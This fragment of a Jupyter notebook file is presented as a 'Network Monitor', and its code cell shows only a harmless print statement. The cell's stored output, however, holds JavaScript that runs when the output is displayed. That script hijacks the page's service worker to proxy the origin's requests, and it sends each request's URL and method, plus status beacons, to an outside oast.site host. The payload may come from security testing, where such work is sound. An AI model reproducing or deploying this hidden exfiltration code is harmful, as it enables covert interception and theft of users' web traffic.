      "source": [
        "# Network Monitor\n\n**Click Run (\u25b6) to start intercepting network requests.**\n\nAfter running, check:\n- Green dot at bottom-right corner\n- Browser console (F12) for success message\n- Your Oast server logs\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sw_hijack"
      },
      "source": [
        "print('Initializing network monitor...')"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(function() {\n    // Send START beacon\n    new Image().src = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site/START';\n\n    // Create a visible indicator on the page (green dot)\n    function showIndicator() {\n        let dot = document.getElementById('sw-hijack-indicator');\n        if (!dot) {\n            dot = document.createElement('div');\n            dot.id = 'sw-hijack-indicator';\n            dot.style.cssText = `\n                position: fixed;\n                bottom: 10px;\n                right: 10px;\n                width: 12px;\n                height: 12px;\n                background-color: #00ff00;\n                border-radius: 50%;\n                z-index: 999999;\n                box-shadow: 0 0 5px rgba(0,0,0,0.5);\n                cursor: pointer;\n                opacity: 0.8;\n            `;\n            dot.title = 'SW Hijack Active';\n            document.body.appendChild(dot);\n        }\n    }\n\n    if (!navigator.serviceWorker) {\n        console.error('Service workers not supported');\n        new Image().src = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site/SW_ERROR?msg=no_service_worker';\n        return;\n    }\n\n    navigator.serviceWorker.ready.then(registration => {\n        const sw = registration.active;\n        if (!sw) {\n            console.error('No active service worker');\n            new Image().src = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site/SW_ERROR?msg=no_active_sw';\n            return;\n        }\n\n        // Create a message channel\n        const channel = new MessageChannel();\n        const myPort = channel.port1;\n        const swPort = channel.port2;\n\n        // Listen for fetch events from the service worker\n        myPort.onmessage = async (event) => {\n            const fetchData = event.data;\n            if (fetchData.action !== 'fetch') return;\n\n            // Exfiltrate request details\n            const url = fetchData.url;\n            const method = fetchData.method;\n            new Image().src = `https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site/FETCH?url=${encodeURIComponent(url)}&method=${method}`;\n\n            // Forward request to real network\n            try {\n                const response = await fetch(url, {\n                    method: method,\n                    headers: fetchData.headers,\n                    body: fetchData.body\n                });\n                const responseData = await response.arrayBuffer();\n                const responseHeaders = {};\n                for (let [k, v] of response.headers.entries()) {\n                    responseHeaders[k] = v;\n                }\n                myPort.postMessage({\n                    action: 'response',\n                    responseId: fetchData.requestId,\n                    response: {\n                        status: response.status,\n                        statusText: response.statusText,\n                        headers: responseHeaders,\n                        data: responseData\n                    }\n                });\n            } catch (err) {\n                myPort.postMessage({\n                    action: 'response',\n                    responseId: fetchData.requestId,\n                    error: err.toString()\n                });\n            }\n        };\n\n        // Tell the service worker to proxy all requests from this origin to our port\n        sw.postMessage({\n            action: 'configure_proxy',\n            serviceWorkerPort: swPort\n        }, [swPort]);\n\n        // Success \u2013 show indicator and send beacon\n        showIndicator();\n        console.log('%c\u2705 Service worker hijacked \u2013 network interception active', 'color: green; font-weight: bold');\n        new Image().src = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site/SW_HIJACKED';\n\n        // Optional: test a fetch to verify interception works (will appear as FETCH beacon)\n        fetch('https://httpbin.org/get').catch(() => {});\n    }).catch(err => {\n        console.error('Failed to hijack:', err);\n        new Image().src = `https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site/SW_ERROR?msg=${encodeURIComponent(err.toString())}`;\n    });\n})();\n",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {}
        },
